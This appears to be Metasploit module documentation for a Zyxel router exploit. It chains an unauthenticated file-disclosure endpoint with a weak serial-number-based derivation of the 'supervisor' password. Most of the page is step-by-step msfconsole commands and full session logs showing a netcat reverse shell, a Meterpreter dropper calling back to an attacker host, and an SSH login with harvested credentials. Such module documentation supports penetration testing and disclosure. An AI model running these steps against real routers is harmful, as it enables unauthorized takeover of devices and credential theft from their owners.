## Vulnerable Application

This module exploits multiple vulnerabilities in the `zhttpd` binary (/bin/zhttpd) and `zcmd` binary (/bin/zcmd).
It is present on more than 40 Zyxel routers and CPE devices.
The remote code execution vulnerability can be exploited by chaining the local file disclosure (LFI) vulnerability
in the `zhttpd` binary that allows an unauthenticated attacker to read the entire configuration of the router
via the vulnerable endpoint `/Export_Log?/data/zcfg_config.json`.

With this information disclosure, the attacker can determine if the router is reachable via `ssh` and use
the second vulnerability in the `zcmd` binary to derive the `supervisor` password by exploiting a weak password
derivation algorithm using the device serial number.

After exploitation, an attacker will be able to execute any command as user `supervisor`.

For more info, read this article: [Zyxel router chained RCE using LFI and Weak Password Derivation Algorithm (No CVE)](https://attackerkb.com/topics/dkw2Y2zdyN/zyxel-router-chained-rce-using-lfi-and-weak-password-derivation-algorithm-no-cve) on [attackerkb.com](url).

Installing a vulnerable test bed requires a vulnerable Zyxel router.
This module has been tested against a vulnerable Zyxel router with the specifications listed below:

* Zyxel router VMG3625-T20A
* Firmware: V5.30(ABQC.3)C0

## Verification Steps

1. Start `msfconsole`
1. `use exploit/linux/http/zyxel_lfi_unauth_ssh_rce`
1. `set RHOSTS <TARGET HOSTS>`
1. `set RPORT <port>`
1. `set LHOST <attacker host ip>`
1. `set LPORT <attacker host port>`
1. `set TARGET <0=unix command, 1=Linux dropper, 2=Interactive SSH>`
1. `exploit`
1. You should be able to get a session based on the target setting.


## Options
Option `STORE_CRED` can be set to store the derived credentials (supervisor) in the database of Metasploit.
Default setting is `true`.

### Advanced options
Option `SSH_DEBUG` can be set to enable SSH debugging output (Extreme verbosity!). Default is `false`.
Option `SSH_TIMEOUT` can be used to specify the maximum time to negotiate a SSH session. Default is 30 seconds.
Option `ConnectTimeout` where you can specify the maximum number of seconds to establish a TCP connection. Default is 10 seconds.

## Scenarios

### Zyxel router VMG3625-T20A - Netcat reverse shell
```
msf6 exploit(linux/http/zyxel_lfi_unauth_ssh_rce) > options

Module options (exploit/linux/http/zyxel_lfi_unauth_ssh_rce):

   Name        Current Setting         Required  Description
   ----        ---------------         --------  -----------
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      192.168.1.1             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasp
                                                 loit/basics/using-metasploit.html
   RPORT       8080                    yes       The target port (TCP)
   SSL         false                   no        Negotiate SSL/TLS for outgoing connections
   SSLCert                             no        Path to a custom SSL certificate (default is randomly generated)
   STORE_CRED  false                   no        Store credentials into the database.
   URIPATH                             no        The URI to use for this exploit (default is random)
   VHOST                               no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on th
                                       e local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.2      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix Command



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/zyxel_lfi_unauth_ssh_rce) > set target 0
target => 0
msf6 exploit(linux/http/zyxel_lfi_unauth_ssh_rce) > exploit

[*] Started reverse TCP handler on 192.168.1.2:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Hardware:VMG3625-T20A Firmware:V5.30(ABQC.3)C0 Serial:S000Y00000000
[+] The target is vulnerable.
[*] Hardware:VMG3625-T20A Firmware:V5.30(ABQC.3)C0 Serial:S000Y00000000
[*] SSH service is available and SSH Port 22 is open. Continue to login.
[*] Derived supervisor password using SerialNumMethod2: 2dc1a078
[*] Derived supervisor password using SerialNumMethod3: 58Pxnwdefr
[*] Authentication with derived supervisor password using Method3 is successful.
[*] Executing Unix Command for cmd/unix/reverse_netcat
[*] Command shell session 1 opened (192.168.1.2:4444 -> 192.168.1.1:51236) at 2023-04-18 19:57:49 +0000

uname -a
Linux VMG3625-T20A 2.6.36 #7 SMP Mon Aug 27 19:59:01 CET 2018 mips GNU/Linux
id
uid=12(supervisor) gid=12 groups=12
exit

[*] 192.168.1.1 - Command shell session 1 closed.
msf6 exploit(linux/http/zyxel_lfi_unauth_ssh_rce)
```

### Zyxel router VMG3625-T20A - Linux Dropper Meterpreter session
```
msf6 exploit(linux/http/zyxel_lfi_unauth_ssh_rce) > set target 1
target => 1
msf6 exploit(linux/http/zyxel_lfi_unauth_ssh_rce) > exploit

[*] Started reverse TCP handler on 192.168.1.2:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Hardware:VMG3625-T20A Firmware:V5.30(ABQC.3)C0 Serial:S000Y00000000
[+] The target is vulnerable.
[*] Hardware:VMG3625-T20A Firmware:V5.30(ABQC.3)C0 Serial:S000Y00000000
[*] SSH service is available and SSH Port 22 is open. Continue to login.
[*] Derived supervisor password using SerialNumMethod2: 2dc1a078
[*] Derived supervisor password using SerialNumMethod3: 58Pxnwdefr
[*] Authentication with derived supervisor password using Method3 is successful.
[*] Executing Linux Dropper for linux/mipsbe/meterpreter/reverse_tcp
[*] Command Stager progress -  42.72% done (499/1168 bytes)
[*] Command Stager progress -  85.36% done (997/1168 bytes)
[*] Sending stage (1299256 bytes) to 127.0.0.1
[*] Command Stager progress - 100.00% done (1168/1168 bytes)
[*] Meterpreter session 2 opened (192.168.1.2:4444 -> 192.168.1.1:40364) at 2023-04-18 20:00:59 +0000

meterpreter > getuid
Server username: supervisor
meterpreter > sysinfo
Computer     : 192.168.1.1
OS           :  (Linux 2.6.36)
Architecture : mips
BuildTuple   : mips-linux-muslsf
Meterpreter  : mipsbe/linux
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.1.1 - Meterpreter session 2 closed.  Reason: User
msf6 exploit(linux/http/zyxel_lfi_unauth_ssh_rce)
```

### Zyxel router VMG3625-T20A - Interactive SSH session and storing the credentials of user supervisor
```
msf6 exploit(linux/http/zyxel_lfi_unauth_ssh_rce) > set target 2
target => 2
msf6 exploit(linux/http/zyxel_lfi_unauth_ssh_rce) > set STORE_CRED true
STORE_CRED => true
msf6 exploit(linux/http/zyxel_lfi_unauth_ssh_rce) > exploit

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Hardware:VMG3625-T20A Firmware:V5.30(ABQC.3)C0 Serial:S000Y00000000
[+] The target is vulnerable.
[*] Hardware:VMG3625-T20A Firmware:V5.30(ABQC.3)C0 Serial:S000Y00000000
[*] SSH service is available and SSH Port 22 is open. Continue to login.
[*] Derived supervisor password using SerialNumMethod2: 2dc1a078
[*] Derived supervisor password using SerialNumMethod3: 58Pxnwdefr
[*] Authentication with derived supervisor password using Method3 is successful.
[*] Credentials for user:supervisor are added to the database...
[*] SSH session 3 opened (192.168.1.2:34493 -> 192.168.1.1:22) at 2023-04-18 20:07:36 +0000

uname -a
Linux VMG3625-T20A 2.6.36 #7 SMP Mon Aug 27 20:08:48 CET 2018 mips GNU/Linux
id
uid=12(supervisor) gid=12 groups=12
exit

[*] 192.168.1.1 - SSH session 3 closed.  Reason: User exit
msf6 exploit(linux/http/zyxel_lfi_unauth_ssh_rce) > creds -u supervisor
Credentials
===========

host           origin         service          public      private   realm  private_type  JtR Format
----           ------         -------          ------      -------   -----  ------------  ----------
192.168.1.1    192.168.1.1    8080/tcp (http)  supervisor  58Pxnwdefr       Password

msf6 exploit(linux/http/zyxel_lfi_unauth_ssh_rce) > 
```

## Limitations
No limitations identified.
